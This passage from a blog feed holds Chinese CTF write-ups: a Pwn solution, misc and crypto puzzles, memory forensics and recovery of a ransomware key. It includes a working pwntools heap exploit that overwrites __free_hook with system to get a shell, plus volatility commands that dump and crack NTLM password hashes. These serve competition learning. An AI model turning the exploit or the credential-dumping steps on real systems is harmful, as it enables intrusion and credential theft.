punctuation">(</span><span class="token punctuation">)</span>cap <span class="token operator">=</span> pyshark<span class="token punctuation">.</span>FileCapture<span class="token punctuation">(</span><span class="token string">"GTP.cap"</span><span class="token punctuation">,</span> display_filter<span class="token operator">=</span><span class="token string">'gtp'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> cap<span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>udp<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>udp<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dm <span class="token operator">=</span> d<span class="token punctuation">(</span>k<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dm<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/ctf-wp-wd/QQ_1730364882540_ZfLQxDTZMA.png"></p><h2 id="Misc04"><a href="#Misc04" class="headerlink" title="Misc04"></a>Misc04</h2><p>将三个文件使用 010editor 16 进制拼接到一起，使用 binwalk 分离得到 11.zip 和 2.png</p><p><img src="/../images/ctf-wp-wd/QQ_1730349108370_G1KwnK4Mn2.png"></p><p>2.png 存在半截 flag，反转图片即可</p><p><img src="/../images/ctf-wp-wd/QQ_1730349669497_MmwP6yo2HZ.png"></p><p>11.zip 存在注释，尝试掩码攻击即可获取密码</p><p><img src="/../images/ctf-wp-wd/QQ_1730349681059_rAgkri65H-.png"></p><p>图片 crc 校验发现存在报错，尝试爆破宽高，得出前半截 flag，拼接即可</p><p><img src="/../images/ctf-wp-wd/QQ_1730350084994_h1Hp_xnZWD.png"></p><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>libc2.31,保护全开，没有UAF也没有off-by-one&#x2F;null，但是注意到edit函数很特别，可以任意地址写入666666这个数字</p><p>这个任意地址写也不是任意值，而是666666这个数字，于是想到了mp_结构体，这样可以扩展tcache，然后通过delete(0)然后再add就可以编辑tcache，这时候就可以写入free_hook，然后打free_hook来getshell</p><p>借鉴源鲁杯的脚本，修修改改，连接在线环境即可获取 flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> u64<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> u32<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> u16<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> u8<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> p64<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> p32<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> p16<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>packing <span class="token keyword">import</span> p8io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc menu<span class="token operator">=</span><span class="token string">"Input your choice"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size :"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content :"</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span> delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>libcbase<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook<span class="token operator">=</span> libcbase <span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>mp_<span class="token operator">=</span>libcbase<span class="token operator">+</span><span class="token number">0x1EC280</span><span class="token operator">+</span><span class="token number">0x50</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>mp_<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span> add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/ctf-wp-wd/QQ_1730355769116_JvkLZ2x-nT.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Crypto01&quot;&gt;&lt;a href=&quot;#Crypto01&quot; class=&quot;headerlink&quot; title=&quot;Crypto01&quot;&gt;&lt;/a&gt;Crypto01&lt;/h2&gt;&lt;p&gt;问AI&amp;#x20;&lt;/p&gt;
&lt;p&gt;提出可以用已知明文攻击，因为平台flag 格式统一，所以密</summary>
      
    
    
    
    <category term="CTF" scheme="https://reputati0n.github.io/categories/CTF/"/>
    
    
    <category term="网鼎杯" scheme="https://reputati0n.github.io/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>第六届集团赛内部选拔赛题解</title>
    <link href="https://reputati0n.github.io/2024/10/28/ctf-wp-ct6/"/>
    <id>https://reputati0n.github.io/2024/10/28/ctf-wp-ct6/</id>
    <published>2024-10-28T07:57:05.000Z</published>
    <updated>2024-10-28T08:30:23.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>由于管理员的误操作使某机器的内存镜像不慎泄露出去。请选手协助数据安全工程师进行内存取证分析，从泄露的内存镜像中找到登录该机器的密码和泄露的个人敏感信息。</p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag-1"></a>flag-1</h3><p>请找到air账户的登录密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility.exe <span class="token parameter variable">-f</span> data.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>Win7SP1x64 hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725670290260_4sGqKPe9oD.png"></p><p>抓到air账户的NTLM hash，对应的明文为 admin123，NTLM对应的明文可在以下这个网站查询</p><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag-2"></a>flag-2</h3><p>请找到泄露的个人敏感信息中“张三”的身份证号</p><p>从内存中搜索可能后缀的文件，发现存在<code>xinxi.zip</code></p><pre class="line-numbers language-batch" data-language="batch"><code class="language-batch"><span class="token command"><span class="token keyword">volatility</span>.exe <span class="token parameter attr-name">-f</span> data.raw <span class="token parameter attr-name">--profile</span>=Win7SP1x64 filescan | grep <span class="token parameter attr-name">-E</span> <span class="token string">"zip|rar|txt|xls|xlsx|doc|docx"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725670640265_qnE9xXFjzu.png"></p><p>将其提取出来</p><pre class="line-numbers language-batch" data-language="batch"><code class="language-batch"><span class="token command"><span class="token keyword">volatility</span>.exe <span class="token parameter attr-name">-f</span> data.raw <span class="token parameter attr-name">--profile</span>=Win7SP1x64 dumpfiles <span class="token parameter attr-name">-Q</span> 0x000000007fb42f20 <span class="token parameter attr-name">-D</span> ./</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725670896571_Pj5dLQvkJR.png"></p><p>提取出来的文件后缀为<code>.dat</code>，手动更改为xinxi.zip即可</p><p><img src="/../images/ctf-wp-ct6/QQ_1725671014489__eWDvOHEFP.png"></p><p>解压发现存在压缩密码，尝试从内存中获取，一般压缩密码会被复制存在于剪贴板中</p><pre class="line-numbers language-batch" data-language="batch"><code class="language-batch"><span class="token command"><span class="token keyword">volatility</span>.exe <span class="token parameter attr-name">-f</span> data.raw <span class="token parameter attr-name">--profile</span>=Win7SP1x64 clipboard</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725671140692_kjzhxY9DqF.png"></p><p>使用<code>shuanadminjimishuju123</code>解压得到<code>个人信息.csv</code>，拿到张三的身份证号</p><p><img src="/../images/ctf-wp-ct6/QQ_1725671234170_2EsyMCwDa9.png"></p><h2 id="机密图片恢复"><a href="#机密图片恢复" class="headerlink" title="机密图片恢复"></a>机密图片恢复</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>某管理员误操作对某机密图片进行了粉碎处理，请选手协助分析，恢复出机密图片内容。</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>打开附件发现为600张被切割开的图片</p><p><img src="/../images/ctf-wp-ct6/QQ_1725671447399_P3-iB9aMpe.png"></p><p>打开属性，发现都是40*40像素的图片</p><p>使用montage对其进行拼接，得到一张完整的图片</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">montage *.png <span class="token parameter variable">-tile</span> 40x40 <span class="token parameter variable">-geometry</span> +0+0 flag.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725671777993_e9zxYHOQ3_.png"></p><p>使用gaps对其进行恢复（可能比较耗时</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gaps run ./flag.png f.png <span class="token parameter variable">--generations</span><span class="token operator">=</span><span class="token number">40</span> <span class="token parameter variable">--population</span><span class="token operator">=</span><span class="token number">600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725671965866_OxzUEgUJ_H.png"></p><h2 id="机密内容恢复"><a href="#机密内容恢复" class="headerlink" title="机密内容恢复"></a>机密内容恢复</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>你所在的单位遭到了黑客的勒索病毒攻击，大部分机密文件均被加密，目前应急部门已经完成了对病毒的逆向分析，还原了部分病毒代码，现需要你根据已有的信息分析加密算法，并解密被加密的文件</p><h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><p><a href="https://reputati0n.github.io/file/file/%E6%9C%BA%E5%AF%86%E5%86%85%E5%AE%B9%E6%81%A2%E5%A4%8D.zip">机密内容恢复的附件.zip</a></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>将附件中<code>keystore.txt</code>的Y值带入计算key的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> QQ<span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> ZZ<span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> matrix<span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> vector<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> k<span class="token punctuation">,</span> s<span class="token punctuation">,</span> m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    diff_bit_length <span class="token operator">=</span> k <span class="token operator">-</span> s    delta <span class="token operator">=</span> c <span class="token operator">%</span> m    y <span class="token operator">=</span> vector<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> diff_bit_length<span class="token punctuation">)</span> <span class="token operator">-</span> delta        delta <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> delta <span class="token operator">+</span> c<span class="token punctuation">)</span> <span class="token operator">%</span> m    B <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>    B<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> m    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        B<span class="token punctuation">[</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">**</span> i        B<span class="token punctuation">[</span>i<span class="token punctuation">,</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    B <span class="token operator">=</span> B<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> B <span class="token operator">*</span> y    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>QQ<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> m <span class="token operator">-</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    delta <span class="token operator">=</span> c <span class="token operator">%</span> m    x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>B<span class="token punctuation">.</span>solve_right<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> state <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> state <span class="token operator">+</span> delta<span class="token punctuation">)</span>        delta <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> delta <span class="token operator">+</span> c<span class="token punctuation">)</span> <span class="token operator">%</span> m    <span class="token keyword">return</span> x    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3312417817</span><span class="token punctuation">]</span>k <span class="token operator">=</span> <span class="token number">128</span>s <span class="token operator">=</span> <span class="token number">32</span>m <span class="token operator">=</span> <span class="token number">297962456582253955990046250846979218011</span>a <span class="token operator">=</span> <span class="token number">71211951805712323543315295789950870568</span>b <span class="token operator">=</span> <span class="token number">215968094306987982220961475017392133478</span>X <span class="token operator">=</span> attack<span class="token punctuation">(</span>Y<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>s<span class="token punctuation">,</span>m<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>X<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sage脚本可在线执行</p><p><a href="https://sagecell.sagemath.org/" title=" Sage Cell Server A simple, embeddable interface for SageMath https://sagecell.sagemath.org/"> Sage Cell Server A simple, embeddable interface for SageMath https://sagecell.sagemath.org/</a></p><p><img src="/../images/ctf-wp-ct6/QQ_1725672815865_9VRW8TCmpd.png"></p><p>算出key后，将key替换入解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token number">126467822674263562126638546968939989865</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token keyword">class</span> <span class="token class-name">YSenc</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>key<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>shift <span class="token operator">=</span> <span class="token number">128</span><span class="token operator">-</span><span class="token number">32</span>        self<span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token number">297962456582253955990046250846979218011</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">71211951805712323543315295789950870568</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">215968094306987982220961475017392133478</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> key    <span class="token keyword">def</span> <span class="token function">_next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token operator">*</span>self<span class="token punctuation">.</span>x <span class="token operator">+</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>m        <span class="token keyword">def</span> <span class="token function">kx</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        Y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        kx <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>kx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>            Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>x <span class="token operator">>></span> self<span class="token punctuation">.</span>shift<span class="token punctuation">)</span>            X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>x<span class="token punctuation">)</span>            kx <span class="token operator">+=</span> self<span class="token punctuation">.</span>x<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>_next<span class="token punctuation">(</span><span class="token punctuation">)</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Y=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Y<span class="token punctuation">&#125;</span></span><span class="token string">\nX=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>X<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> kx        <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> self<span class="token punctuation">.</span>kx<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"secret_credentials.csv.lock"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"secret_credentials.csv"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>YSenc<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/ctf-wp-ct6/QQ_1725672942047_Y_GEO6_6xd.png"></p><p>拿到flag</p><p><img src="/../images/ctf-wp-ct6/QQ_1725672970163_WbtMyuNGzT.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内存取证&quot;&gt;&lt;a href=&quot;#内存取证&quot; class=&quot;headerlink&quot; title=&quot;内存取证&quot;&gt;&lt;/a&gt;内存取证&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h</summary>
      
    
    
    
    <category term="CTF" scheme="https://reputati0n.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://reputati0n.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>重建我的 Blog</title>
